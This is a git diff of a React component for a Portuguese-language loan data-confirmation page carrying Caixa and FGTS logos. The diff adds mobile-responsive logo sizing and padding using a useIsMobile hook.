@@ -5,6 +5,7 @@ import CaixaLogo from '@/components/CaixaLogo';
 import FGTSLogo from '@/components/FGTSLogo';
 import { Button } from '@/components/ui/button';
 import { useNavigate } from 'react-router-dom';
+import { useIsMobile } from '@/hooks/use-mobile';
 
 interface UserData {
   DADOS: {
@@ -19,6 +20,7 @@ interface UserData {
 const LoanConfirmation = () => {
   const [userData, setUserData] = useState<UserData | null>(null);
   const navigate = useNavigate();
+  const isMobile = useIsMobile();
   
   useEffect(() => {
     // Try to get user data from localStorage
@@ -64,13 +66,13 @@ const LoanConfirmation = () => {
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
       {/* Header */}
-      <div className="p-6 flex justify-between items-center">
-        <FGTSLogo className="h-10" />
-        <CaixaLogo className="h-10" />
+      <div className="p-4 sm:p-6 flex justify-between items-center">
+        <FGTSLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
+        <CaixaLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
       </div>
 
       {/* Title */}
-      <div className="p-6">
+      <div className="p-4 sm:p-6">
         <div className="text-white text-2xl font-light">Confirmação de Dados</div>
         <div className="text-white opacity-60 text-sm mt-1">
           Verifique se seus dados estão corretos para prosseguir com o empréstimo
@@ -79,7 +81,7 @@ const LoanConfirmation = () => {
 
       {/* Main content */}
       <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
-        <div className="p-6">
+        <div className="p-4 sm:p-6">
           {/* User data confirmation */}
           <div className="bg-white border border-gray-200 rounded-lg p-5 mb-6 shadow-sm">
             <h2 className="text-[#005CA9] text-xl font-semibold mb-4">Dados Pessoais</h2>
